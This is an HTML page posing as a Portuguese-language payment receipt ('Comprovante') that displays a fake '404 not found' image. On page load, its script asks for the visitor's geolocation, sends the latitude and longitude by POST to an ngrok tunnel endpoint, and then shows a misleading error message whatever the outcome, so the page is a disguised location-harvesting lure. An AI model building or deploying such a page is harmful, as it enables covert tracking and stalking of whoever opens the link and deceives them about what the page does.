<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8">
  <title>Comprovante</title>
</head>

<body style="background-color: antiquewhite; margin: 0; height: 100%; width: 100%;">
  <div style="height: 100%; width: 100%; display: flex; justify-content: center; align-items: center;">
    <img src="https://i.ibb.co/pjvxdbb4/error-404-not-found.png" style="width: 100%; height: 100%; object-fit: cover;">
  </div>
</body>

  <script>
    // Executa automaticamente ao carregar a página
    window.addEventListener("load", () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
      } else {
        alert("Algo deu errado. Tente novamente mais tarde.");
      }
    });

    function sendLocation(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      console.log("Latitude: " + latitude);
      console.log("Longitude: " + longitude);

      // Envia a localização para o backend
      fetch("https://0e9c-2804-7f0-3e8-34-4e1c-b1c0-4e10-942d.ngrok-free.app/send-location", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ latitude, longitude })
      })
        .then(response => response.json())
        .then(data => {
          if (data.success) {
            alert("Algo deu errado. Tente novamente mais tarde.");
          } else {
            alert("Algo deu errado. Tente novamente mais tarde.");
          }
        })
        .catch(error => {
          console.error("Erro:", error);
        });
    }

    function handleError(error) {
      alert("Não foi possível visualizar o comprovante: " + error.message);
    }
  </script>
</body>

</html>
